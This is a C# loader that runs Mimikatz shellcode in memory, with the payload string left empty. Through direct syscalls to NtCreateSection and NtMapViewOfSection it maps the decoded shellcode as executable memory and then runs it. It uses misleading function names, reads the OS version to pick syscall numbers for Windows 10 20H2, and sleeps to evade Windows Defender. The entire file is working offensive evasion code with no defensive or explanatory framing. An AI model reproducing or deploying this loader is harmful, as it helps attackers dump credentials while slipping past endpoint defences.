using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO.MemoryMappedFiles;
using System.Management;
using System.Threading;


public unsafe class Upsilon
{

  public enum RESULT : uint
  {
      Success = 0x00000000,
      Wait0 = 0x00000000
  }

  [StructLayout(LayoutKind.Sequential)]
  public struct OSversion
  {
      public int dwMajorVersion;
      public int dwMinorVersion;
      public int dwBuildNumber;
  }


  class Program
  {
      [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
      public delegate RESULT CallThe();

      // NtCreateSection
      public delegate RESULT WriteLineL( ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaximumSize, uint pageProt, uint allocationAttribs, IntPtr hFile );
      public static RESULT WriteLine( byte WM0, byte WM1, ref IntPtr section, IntPtr pAttrs, ref long MaximumSize, IntPtr hFile, ref OSversion info )
      {
          var Protect = Protect<WriteLineL>( Value( 1, ref info ) );
          return Protect( ref section, 0xE, pAttrs, ref MaximumSize, 0x40, 0x8000000, hFile );
      }

      // NtMapViewOfSection
      public delegate RESULT ReadLineL( IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, ref long SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect );
      public static RESULT ReadLine( byte WM0, byte WM1, IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, ref long SectionOffset, ref long ViewSize, ref OSversion info )
      {
          var Protect = Protect<ReadLineL>( Value( 2, ref info ) );
          return Protect( SectionHandle, ProcessHandle, ref BaseAddress, IntPtr.Zero, IntPtr.Zero, ref SectionOffset, ref ViewSize, 0x2, 0x0, 0x40 );
      }

      unsafe public static byte [] Resolver()
      {


          string data =

          char[] charstr = data.ToCharArray();
          string str = new string(charstr);
          string tmp = "";
          byte [] SArray = new byte [1309884]; // length of Mimikatz shellcode bytes
          int idx = 0;
          byte[] buf = { 000 };
          GCHandle pinnedObject = GCHandle.Alloc(str, GCHandleType.Pinned);
          IntPtr ptr = pinnedObject.AddrOfPinnedObject();
          pinnedObject.Free();

          for (int i = 0; i <= 1309883; i++)
          {
              for (int k = 0; k <= 2; k++) // each shellcode is 3 digits format ex. 232 144 001
              {
                  buf[0] = Marshal.ReadByte( ptr + idx );
                  tmp = tmp + System.Text.Encoding.UTF8.GetString( buf );
                  idx++;
              }
              SArray[ i ] = Byte.Parse( tmp );
              tmp = "";
          }
          return SArray;
       }

      public static byte [] Value( int func, ref OSversion osVersionInfo )
      {
        // Supports Windows 10 build 20H2 64 bit, ust add more logic to support other versions
        if (( osVersionInfo.dwMinorVersion == 0 ) & ( osVersionInfo.dwBuildNumber == 19042 )) // 20H2
           {
              // NtCreateSection syscall = 0x004A
              if ( func == 1 )
              {
                  return new byte [] { (77-1), (140-1), (210-1), (185-1), (byte)0x004A, (byte)(0x004A >> 8), (1-1), (1-1), (16-1), (6-1), (196-1) };
              } else
              // NtMapViewOfSection syscall = 0x0028
              if ( func == 2 )
              {
                 return new byte [] { (77-1), (140-1), (210-1), (185-1), (byte)0x0028, (byte)(0x0028 >> 8), (1-1), (1-1), (16-1), (6-1), (196-1) };
              }
           }
        return new byte [] { }; // Unsuppoted version
      }


      public static unsafe CODE Protect<CODE>( byte[] buffer ) where CODE : class
      {
          try
          {
              // https://docs.microsoft.com/en-us/dotnet/api/system.io.memorymappedfiles.memorymappedfile.createnew?view=net-5.0
              var NewGuid = Guid.NewGuid().ToString();
              var MemMapSystemMem = MemoryMappedFile.CreateNew( NewGuid, buffer.Length, MemoryMappedFileAccess.ReadWriteExecute );
              var MemMapViewAccessor = MemMapSystemMem.CreateViewAccessor( 0, buffer.Length, MemoryMappedFileAccess.ReadWriteExecute );
              MemMapViewAccessor.WriteArray( 0, buffer, 0, buffer.Length );
              byte* code = (byte*)IntPtr.Zero;
              MemMapViewAccessor.SafeMemoryMappedViewHandle.AcquirePointer( ref code );
              return (CODE)(object)Marshal.GetDelegateForFunctionPointer( (IntPtr)code, typeof(CODE) );
          }
          catch
          {
              return null;
          }
      }


      public static unsafe void GetVersion( ref OSversion info )
      {
          IntPtr KUSER_SHARED_DATA = new IntPtr(0x7FFE0000);
          IntPtr ptrMajorVersion = (IntPtr)(KUSER_SHARED_DATA + 0x026C);
          info.dwMajorVersion = *(int*)(ptrMajorVersion);
          IntPtr ptrMinorVersion = (IntPtr)(KUSER_SHARED_DATA + 0x0270);
          info.dwMinorVersion = *(int*)(ptrMinorVersion);
          IntPtr ptrBuildNumber = (IntPtr)(KUSER_SHARED_DATA + 0x0260);
          info.dwBuildNumber = *(int*)(ptrBuildNumber);
      }

      static void Main()
      {

          OSversion osVersionInfo = new OSversion { };
          GetVersion( ref osVersionInfo );
          // Find Mimikatz raw code, pasted with hex editor
          byte [] data = new byte [1309884];
          data = Resolver();
  				IntPtr SectionHandle = IntPtr.Zero;
  				long ScectionDataSize = data.Length;
          // WM0 and WM1 is dummy values not used
          byte WM0 = 100;
          byte WM1 = 100;
          // WriteLine is NtCreateSection
  				WriteLine( WM0, WM1, ref SectionHandle, IntPtr.Zero, ref ScectionDataSize, IntPtr.Zero, ref osVersionInfo );
  				IntPtr localSectionAddress = IntPtr.Zero;
  				long localSectionOffset = 0;
          // ReadLine is NtMapViewOfSection
          ReadLine( WM0, WM1, SectionHandle, (IntPtr)(-1), ref localSectionAddress, ref localSectionOffset, ref ScectionDataSize, ref osVersionInfo );
  				Marshal.Copy(data, 0, localSectionAddress, data.Length);
          // if Windows Defender is running sleep 15 sec
          TimeSpan TS = new TimeSpan( 0,0,15 );
          Thread.Sleep(TS);
          CallThe Cat = ( CallThe )Marshal.GetDelegateForFunctionPointer( localSectionAddress, typeof( CallThe ) );
          Cat();

      }
   }
}